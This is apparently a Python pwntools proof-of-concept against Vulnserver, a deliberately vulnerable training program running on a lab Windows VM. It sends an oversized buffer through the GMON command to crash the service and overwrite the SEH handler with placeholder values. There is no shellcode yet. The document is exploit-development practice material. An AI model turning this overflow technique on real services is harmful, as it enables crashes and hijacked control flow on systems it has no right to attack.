#!/usr/bin/python
from pwn import *


host = "192.168.130.156"     # Windows VM
port = 9999                 # Vulnserver port


nextSEH = 'CCCC'
SEH = 'BBBB'

buffer = 'A' * 3546     # Buffer to crash vulnserver
buffer += nextSEH       # Value to control the address of the next SEH
buffer += SEH           # Value to control the SEH value
buffer += 'D' * (5012 - len(buffer))      # C buffer to help round out the payload to match the overflow identified previously

conn = remote(host, port)   # pwntools way to connect to host
conn.recvline()             # receive connection to host

conn.send("GMON /.../" + buffer)     # send evil buffer

conn.close()                        # Close connection if not hung
